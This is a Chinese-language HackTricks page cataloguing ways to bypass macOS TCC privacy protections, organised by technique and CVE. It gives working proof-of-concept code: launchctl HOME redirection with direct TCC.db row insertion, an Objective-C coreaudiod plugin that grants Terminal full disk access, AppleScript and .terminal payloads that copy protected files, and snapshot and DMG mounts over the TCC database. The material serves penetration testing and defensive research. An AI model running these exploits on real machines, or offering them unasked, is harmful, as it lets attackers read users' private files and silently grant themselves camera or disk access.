# macOS TCC绕过

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 按功能分类

### 写入绕过

这不是一个绕过，这只是TCC的工作原理：**它不会阻止写入操作**。如果终端**无法读取用户的桌面，它仍然可以写入其中**：
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**扩展属性`com.apple.macl`**被添加到新的**文件**中，以使**创建者的应用程序**能够访问它。

### SSH绕过

默认情况下，通过**SSH**访问将具有**"完全磁盘访问"**权限。为了禁用此权限，您需要将其列出但禁用（从列表中删除不会删除这些权限）：

![](<../../../../.gitbook/assets/image (569).png>)

在这里，您可以找到一些**恶意软件如何绕过此保护**的示例：

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
请注意，现在为了能够启用SSH，您需要**完全磁盘访问**权限
{% endhint %}

### 处理扩展名 - CVE-2022-26767

属性**`com.apple.macl`**被赋予文件以赋予**某个应用程序读取它的权限**。当用户通过**拖放**文件到应用程序上或者双击文件以使用**默认应用程序**打开它时，将设置此属性。

因此，用户可以**注册一个恶意应用程序**来处理所有扩展名，并调用启动服务来**打开**任何文件（因此恶意文件将被授予读取权限）。

### iCloud

使用权限**`com.apple.private.icloud-account-access`**可以与**`com.apple.iCloudHelper`** XPC服务进行通信，该服务将**提供iCloud令牌**。

**iMovie**和**Garageband**具有此权限以及其他权限。

有关从该权限中获取iCloud令牌的漏洞的更多**信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

具有**`kTCCServiceAppleEvents`**权限的应用程序将能够**控制其他应用程序**。这意味着它可以滥用授予其他应用程序的权限。

有关Apple脚本的更多信息，请查看：

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

例如，如果一个应用程序具有对`iTerm`的**自动化权限**，例如在此示例中**`Terminal`**具有对iTerm的访问权限：

<figure><img src="../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### 在iTerm上

没有FDA的Terminal可以调用具有FDA的iTerm，并使用它执行操作：

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### 通过Finder

或者，如果一个应用程序在Finder上具有访问权限，它可以使用以下脚本之一：
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## 通过应用行为

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

用户空间的 **tccd 守护进程** 使用 **`HOME`** **env** 变量来访问 TCC 用户数据库：**`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

根据[这个 Stack Exchange 帖子](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)和因为 TCC 守护进程是通过 `launchd` 在当前用户域中运行的，可以**控制传递给它的所有环境变量**。\
因此，攻击者可以在 **`launchctl`** 中设置 `$HOME` 环境变量，指向一个**受控的目录**，然后**重新启动** TCC 守护进程，然后直接修改 TCC 数据库，以获取自己所需的**所有 TCC 权限**，而无需提示最终用户。\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - 笔记

笔记可以访问 TCC 保护的位置，但是当创建笔记时，它会被创建在一个非受保护的位置。因此，你可以要求笔记将受保护的文件复制到一个笔记中（即非受保护的位置），然后访问该文件：

<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-XXXX - 迁移

二进制文件 `/usr/libexec/lsd` 与库 `libsecurity_translocate` 具有权限 `com.apple.private.nullfs_allow`，允许其创建 **nullfs** 挂载，并具有权限 `com.apple.private.tcc.allow` 与 **`kTCCServiceSystemPolicyAllFiles`** 以访问所有文件。

可以将隔离属性添加到 "Library"，调用 **`com.apple.security.translocation`** XPC 服务，然后它将将 Library 映射到 **`$TMPDIR/AppTranslocation/d/d/Library`**，从而可以访问 Library 中的所有文档。

### SQL 跟踪

如果环境变量 **`SQLITE_AUTO_TRACE`** 被设置，库 **`libsqlite3.dylib`** 将开始记录所有的 SQL 查询。许多应用程序使用此库，因此可以记录它们的所有 SQLite 查询。

几个 Apple 应用程序使用此库来访问 TCC 保护的信息。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Apple远程桌面

作为root用户，您可以启用此服务，并且ARD代理将具有完全磁盘访问权限，用户可以滥用此权限使其复制新的TCC用户数据库。

## 通过插件

插件是额外的代码，通常以库或plist的形式存在，它们将由主应用程序加载并在其上下文中执行。因此，如果主应用程序可以访问TCC受限文件（通过授予权限或授予的权限），则自定义代码也将具有相同的访问权限。

### CVE-2020-27937 - 目录实用工具

应用程序`/System/Library/CoreServices/Applications/Directory Utility.app`具有权限`kTCCServiceSystemPolicySysAdminFiles`，加载了扩展名为`.daplug`的插件，并且没有启用强化运行时。

为了利用此CVE，滥用先前的权限，将`NFSHomeDirectory`更改为能够接管用户的TCC数据库以绕过TCC。

有关更多信息，请查看[原始报告](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)。

### CVE-2020-29621 - Coreaudiod

二进制文件`/usr/sbin/coreaudiod`具有权限`com.apple.security.cs.disable-library-validation`和`com.apple.private.tcc.manager`。第一个权限允许代码注入，第二个权限允许其管理TCC。

该二进制文件允许从文件夹`/Library/Audio/Plug-Ins/HAL`加载第三方插件。因此，可以使用此PoC加载插件并滥用TCC权限：
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
有关更多信息，请查看[**原始报告**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)。

### 设备抽象层（DAL）插件

通过Core Media I/O打开相机流的系统应用程序（具有**`kTCCServiceCamera`**的应用程序）会在进程中加载位于`/Library/CoreMediaIO/Plug-Ins/DAL`中的这些插件（不受SIP限制）。

只需在其中存储一个具有常见**构造函数**的库即可用于**注入代码**。

几个Apple应用程序存在此漏洞。

## 通过进程注入

有不同的技术可以在进程内注入代码并滥用其TCC权限：

{% content-ref url="../../macos-proces-abuse/" %}
[macos-proces-abuse](../../macos-proces-abuse/)
{% endcontent-ref %}

### Firefox

Firefox应用程序仍然存在漏洞，具有`com.apple.security.cs.disable-library-validation`权限：
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
有关如何轻松利用此漏洞的更多信息，请查看[**原始报告**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。

### CVE-2020-10006

二进制文件`/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl`具有权限**`com.apple.private.tcc.allow`**和**`com.apple.security.get-task-allow`**，允许在进程内注入代码并使用TCC权限。

### CVE-2023-26818 - Telegram

Telegram具有权限`com.apple.security.cs.allow-dyld-environment-variables`和`com.apple.security.cs.disable-library-validation`，因此可以滥用它以获取其权限，例如使用摄像头进行录制。您可以在[**写作中找到有效载荷**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。

## 通过打开调用

可以在受沙盒限制的环境中调用打开。

### 终端脚本

通常会为终端授予**完全磁盘访问权限（FDA）**，至少在技术人员使用的计算机上是如此。可以使用它来调用**`.terminal`**脚本。

**`.terminal`**脚本是plist文件，其中包含要在**`CommandString`**键中执行的命令：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
应用程序可以在/tmp等位置编写一个终端脚本，并使用如下命令启动它：
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## 通过挂载

### CVE-2020-9771 - mount\_apfs TCC绕过和权限提升

**任何用户**（即使是非特权用户）都可以创建和挂载时间机器快照，并**访问该快照的所有文件**。\
唯一需要的特权是所使用的应用程序（如`Terminal`）需要具有**完全磁盘访问权限**（FDA）（`kTCCServiceSystemPolicyAllfiles`），这需要由管理员授予。

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

更详细的解释可以在[原始报告中找到](https://theevilbit.github.io/posts/cve\_2020\_9771/)。

### CVE-2021-1784和CVE-2021-30808 - 在TCC文件上挂载

即使TCC DB文件受到保护，仍然可以在目录上**挂载一个新的TCC.db文件**：

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
查看[原始文档](https://theevilbit.github.io/posts/cve-2021-30808/)中的**完整利用**。

### asr

工具**`/usr/sbin/asr`**允许复制整个磁盘并将其挂载到另一个位置，绕过TCC保护。

### 位置服务

在**`/var/db/locationd/clients.plist`**中有第三个TCC数据库，用于指示允许**访问位置服务**的客户端。\
文件夹**`/var/db/locationd/`没有受到DMG挂载的保护**，因此可以挂载我们自己的plist。

## 通过启动应用程序

{% content-ref url="../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## 通过grep

在许多情况下，文件会将敏感信息（如电子邮件、电话号码、消息等）存储在未受保护的位置（这在Apple中被视为漏洞）。

<figure><img src="../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## 参考

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
